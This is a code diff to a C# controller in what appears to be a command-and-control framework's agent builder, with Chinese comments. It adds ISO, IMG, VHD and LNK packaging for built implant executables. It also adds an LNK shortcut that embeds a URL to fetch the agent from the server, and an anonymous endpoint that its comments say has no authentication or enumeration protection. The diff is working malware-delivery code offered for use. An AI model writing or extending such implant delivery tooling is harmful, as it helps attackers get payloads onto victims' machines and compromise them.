@@ -373,7 +373,7 @@ public class BuilderController : ControllerBase
     }
 
     [HttpGet("download/{buildId}")]
-    public IActionResult Download(string buildId)
+    public IActionResult Download(string buildId, [FromQuery] string? format)
     {
         var history = BuilderBuildService.LoadHistory();
         var record = history.FirstOrDefault(r => r.Id == buildId);
@@ -384,8 +384,67 @@ public class BuilderController : ControllerBase
         if (!System.IO.File.Exists(filePath))
             return NotFound(new { error = "Build file not found on disk." });
 
-        var stream = System.IO.File.OpenRead(filePath);
-        return File(stream, "application/octet-stream", record.FileName);
+        // 按需打包格式：iso / img / vhd / lnk（构建产物不变，一次构建多格式投递）
+        switch (format?.ToLowerInvariant())
+        {
+            case "iso":
+            {
+                var payload = System.IO.File.ReadAllBytes(filePath);
+                var bytes = Services.Packaging.BuilderPackageService.CreateIso("LIBRA", payload);
+                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.iso");
+            }
+            case "img":
+            {
+                var payload = System.IO.File.ReadAllBytes(filePath);
+                var bytes = Services.Packaging.BuilderPackageService.CreateImg(payload);
+                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.img");
+            }
+            case "vhd":
+            {
+                var payload = System.IO.File.ReadAllBytes(filePath);
+                var bytes = Services.Packaging.BuilderPackageService.CreateVhd(payload);
+                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.vhd");
+            }
+            case "lnk":
+            {
+                // 快捷方式内嵌匿名下载 URL（agent 可执行文件直出，无需鉴权）
+                var scheme = Request.Scheme;
+                var host = Request.Host.Value;
+                var url = $"{scheme}://{host}/api/beacon/artifact/{buildId}";
+                var bytes = Services.Packaging.BuilderPackageService.CreateLnk(url);
+                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.lnk");
+            }
+            default:
+            {
+                var stream = System.IO.File.OpenRead(filePath);
+                return File(stream, "application/octet-stream", record.FileName);
+            }
+        }
+    }
+
+    /// <summary>
+    /// 匿名下载已构建的 agent 可执行文件（/api/beacon/artifact/{buildId}）。
+    /// 供「一键命令」/ LNK 内嵌下载使用：无鉴权、无枚举防护（复用 8 位 buildId），
+    /// 删除构建记录即失效。仅对 Windows 构建开放（Linux 载荷无 exe 概念）。
+    /// </summary>
+    [HttpGet("/api/beacon/artifact/{buildId}")]
+    [AllowAnonymous]
+    public IActionResult DownloadArtifact(string buildId)
+    {
+        if (string.IsNullOrWhiteSpace(buildId) || buildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
+            return BadRequest(new { error = "invalid build id" });
+
+        var history = BuilderBuildService.LoadHistory();
+        var record = history.FirstOrDefault(r => r.Id == buildId);
+        if (record == null || record.Status != "completed")
+            return NotFound(new { error = "Build not found." });
+
+        var filePath = Path.Combine(BuilderBuildService.OutputBase, buildId, record.FileName);
+        if (!System.IO.File.Exists(filePath))
+            return NotFound(new { error = "Build file not found on disk." });
+
+        var bytes = System.IO.File.ReadAllBytes(filePath);
+        return File(bytes, "application/octet-stream", record.FileName);
     }
 
     [HttpDelete("{buildId}")]
